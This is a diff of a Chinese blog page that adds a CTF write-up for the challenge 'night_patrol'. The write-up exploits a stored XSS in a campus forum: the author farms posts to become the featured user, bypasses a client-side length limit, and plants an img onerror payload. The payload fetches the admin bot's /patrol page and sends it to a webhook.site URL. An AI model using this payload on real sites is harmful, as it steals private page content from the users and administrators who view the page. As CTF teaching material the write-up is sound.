@@ -75,6 +75,89 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-鲲鹏杯web-night_patrol" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/" class="article-date">
+  <time class="dt-published" datetime="2026-10-16T13:33:22.204Z" itemprop="datePublished">2026-10-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/">鲲鹏杯web-[night_patrol]</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1>鲲鹏杯web-[night_patrol]</h1>
+<ul>
+<li>鲲鹏杯web题目</li>
+</ul>
+<p>本题考点：<strong>存储型 XSS，窃取内网 / 管理员浏览器页面内容（XSS 数据外带）</strong><br>
+flag:<code>NSSCTF{60ad8607‑7f07‑4fc0‑ba19‑b5a1e232ab99}</code></p>
+<p>靶场是一个校园树洞网站,有一个巡查机器人(小灵通)会读今日执行的签名</p>
+<p><img src="/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/1.png" alt="alt text"></p>
+<p>打开F12,可以找到<br>
+<code>document.getElementById('starsign').innerHTML = d.star.sign</code><br>
+这样一个js片段:</p>
+<ul>
+<li><code>d.star.sign</code>：就是用户的个人签名 sign 字段，我们注册账号后可以自己修改签名，完全用户可控。</li>
+<li><code>innerHTML</code>：直接把我们输入的签名当做 HTML 渲染，不会做 HTML 转义过滤</li>
+</ul>
+<p>所以我的目标就是成为今日之星，将恶意代码写在我的签名页，让小灵通执行</p>
+<ol>
+<li>注册账号 <code>hacker001</code>。</li>
+<li>不停重复发帖，疯狂刷帖子数量，当你的发帖数超过原来的第一名<code>laomao</code>。</li>
+<li>访问接口<code>/api/state</code>，观察返回的<code>star</code>字段，发现 star 变成你的账号<code>hacker001</code>，此时我成为了今日之星<br>
+(一般就发帖功能就可以尝试多发几条，说不定有意外之喜)</li>
+</ol>
+<p><img src="/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/2.png" alt="alt text"></p>
+<p>然后打开https://webhook.site获得一个专属URL:</p>
+<p><img src="image.png" alt="alt text"></p>
+<p>我的是https://webhook.site/d2fe4ec2‑9292‑48ee‑9130‑6b6bc0e1ca39</p>
+<p>然后就可以返回靶场,将XSS Payload输入到我的签名当中:<br>
+<code> &lt;img src=x onerror=&quot;fetch('/patrol').then(r=&gt;r.text()).then(t=&gt;location='https://webhook.site/d2fe4ec2-9292-48ee-9130-6b6bc0e1ca39/?d='+encodeURIComponent(t))&quot;&gt;</code></p>
+<p>后面的网址要根据自己的URL去修改<br>
+最开始发现签名栏里面有长度限制</p>
+<p><img src="/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/3.png" alt="alt text"></p>
+<p>将图中的 <code>160</code>修改为<code>16000</code></p>
+<p><img src="/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/4.png" alt="alt text"></p>
+<p>然后就可以输入完整的payload了</p>
+<p><img src="/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/5.png" alt="alt text"></p>
+<p>最后只需要等待小灵通访问我的签名，然后就可以在外部网址上找到flag：</p>
+<p><img src="/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/6.png" alt="alt text"></p>
+<p>这题主要是因为:后端没有对用户输入做转义过滤，直接存数据库，之后取出放到网页里输出给别人（bot 管理员）<br>
+浏览器会把 <code>&lt;script&gt;</code> 当成 JS 代码执行，不是文本</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://xiafujian.github.io/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/" data-id="cuid-wP6QXp9DANTeYUDGd43O" data-title="鲲鹏杯web-[night_patrol]" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-鲲鹏杯web-EZ-EL" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/10/13/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-EZ-EL/" class="article-date">
@@ -984,6 +1067,10 @@ GET:<br>
       <ul>
         
           <li>
+            <a href="/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/">鲲鹏杯web-[night_patrol]</a>
+          </li>
+        
+          <li>
             <a href="/2026/10/13/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-EZ-EL/">鲲鹏杯web-[EZ-EL]</a>
           </li>
         
@@ -997,10 +1084,6 @@ GET:<br>
         
           <li>
             <a href="/2026/09/28/sqli-lab-7/">sqli-lab-7的wp</a>
-          </li>
-        
-          <li>
-            <a href="/2026/09/27/sqli-lab-5~6/">sqli-lab-5~6的wp</a>
           </li>
         
       </ul>
